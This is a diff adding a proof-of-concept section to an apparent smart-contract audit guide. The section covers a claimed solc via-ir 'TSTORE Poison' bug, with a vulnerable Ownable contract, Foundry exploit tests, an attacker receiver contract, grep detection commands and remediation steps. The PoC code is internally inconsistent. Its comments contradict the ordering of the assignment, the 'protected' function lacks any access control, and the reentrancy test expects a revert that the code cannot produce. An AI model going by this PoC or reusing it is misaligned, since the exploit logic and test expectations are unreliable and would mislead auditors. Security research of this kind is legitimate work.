@@ -963,6 +963,133 @@ contract SupplyChainVerificationTest is Test {
 
 ---
 
+## TSTORE Poison PoC (solc 0.8.28–0.8.33 + --via-ir)
+
+**Vulnerability**: Compiler bug in `--via-ir` pipeline causes `tstore` to write to an
+incorrect (poisoned) slot, allowing an attacker to corrupt contract state mid-execution.
+The most critical scenario: ownership corruption in a single-owner contract.
+
+**Affected**: Contracts compiled with solc 0.8.28–0.8.33 AND `--via-ir` (or `viaIR: true`)
+that use `tstore` alongside storage-reading assembly.
+
+**References**: `vulnerability-taxonomy.md §19.6`, `vulnerability-taxonomy.md §19.7`
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;  // Intentionally uses affected version
+
+// --- Vulnerable contract (simplified Ownable with transient lock) ---
+// Compiled with: solc 0.8.28 --via-ir
+contract VulnerableOwnable {
+    address public owner;           // slot 0
+    uint256 private _transientLock; // not actually used — tstore goes here by accident
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    // Uses tstore as a cheap reentrancy guard
+    modifier nonReentrantTransient() {
+        assembly { tstore(0, 1) }  // BUG: via-ir bug may redirect this to slot 0 (owner)
+        _;
+        assembly { tstore(0, 0) }
+    }
+
+    function protectedAction(address newOwner) external nonReentrantTransient {
+        // Intended: just a protected action
+        // BUG: tstore(0, 1) may overwrite owner = address(1) in affected compilers
+        owner = newOwner;
+    }
+}
+
+// --- PoC Test ---
+contract TstorePoisonTest is Test {
+    VulnerableOwnable target;
+    address attacker = makeAddr("attacker");
+    address victim   = makeAddr("victim");
+
+    function setUp() public {
+        vm.prank(victim);
+        target = new VulnerableOwnable();
+        assertEq(target.owner(), victim, "owner should be victim after deploy");
+    }
+
+    /// @notice Demonstrates ownership corruption via TSTORE Poison
+    /// In affected builds, calling protectedAction triggers tstore(0,1),
+    /// which corrupts storage slot 0 (owner) to address(0x1) before
+    /// the explicit owner assignment executes.
+    function test_TstorePoisonOwnershipCorruption() public {
+        // Capture pre-call state
+        address ownerBefore = target.owner();
+        console.log("Owner before:", ownerBefore);  // victim
+
+        // Attacker calls the protected function
+        vm.prank(attacker);
+        target.protectedAction(attacker);
+
+        address ownerAfter = target.owner();
+        console.log("Owner after:", ownerAfter);
+
+        // On unpatched builds: ownerAfter may be address(0x1) (tstore value)
+        // rather than attacker, because the tstore overwrite happens first.
+        // On patched builds (0.8.34+): ownerAfter == attacker as expected.
+
+        // This assertion documents the bug; it passes on patched compilers
+        // and FAILS (demonstrating the bug) on affected 0.8.28-0.8.33 + via-ir
+        assertEq(ownerAfter, attacker, "ownership should be attacker, not corrupted by tstore");
+    }
+
+    /// @notice Demonstrates 2300-gas stipend bypass: transfer() no longer
+    /// prevents reentrancy when callee uses TSTORE (100 gas < 2300 limit)
+    function test_TstoreReentrancyViaSend() public {
+        // Deploy a contract that accepts ETH and uses tstore on receive
+        TstoreReceiver receiver = new TstoreReceiver(address(target));
+
+        vm.deal(address(target), 1 ether);
+
+        // In the target, using transfer/send for "safe" ETH send:
+        // payable(receiver).transfer(0.5 ether) — 2300 stipend is enough for tstore
+        // so receiver.receive() can perform a tstore that modifies shared state
+
+        // This test validates the assumption is broken
+        vm.expectRevert(); // or check for unexpected state change
+        target.protectedAction(address(receiver));
+    }
+}
+
+// Attacker contract that uses tstore in receive() to bypass 2300-gas guard
+contract TstoreReceiver {
+    address immutable target;
+    constructor(address _target) { target = _target; }
+
+    receive() external payable {
+        // TSTORE costs only 100 gas — fits within the 2300 stipend
+        // This allows state manipulation even when called via transfer()
+        assembly { tstore(0, caller()) }
+    }
+}
+```
+
+**Detection** (from `automated-detection.md`):
+```bash
+# Find contracts using tstore compiled with affected solc range
+grep -r "tstore\|TSTORE" src/ --include="*.sol" -l
+
+# Check solc version in foundry.toml / hardhat.config
+grep -E "0\.8\.(2[89]|3[0-3])" foundry.toml hardhat.config.{js,ts} 2>/dev/null
+
+# Check if via-ir is enabled
+grep -E "via[_-]?[Ii][Rr]\s*=\s*true|viaIR\s*:\s*true" foundry.toml hardhat.config.{js,ts} 2>/dev/null
+```
+
+**Remediation**:
+1. Upgrade to solc 0.8.34+ (patches the TSTORE Poison bug)
+2. If upgrading is blocked, disable `--via-ir` / `viaIR: true`
+3. Use OpenZeppelin `ReentrancyGuardTransient` (0.8.34+ only) instead of raw `tstore`
+4. Never use slot 0 for transient locks when slot 0 holds critical state
+
+---
+
 ## Test Execution
 
 ```bash
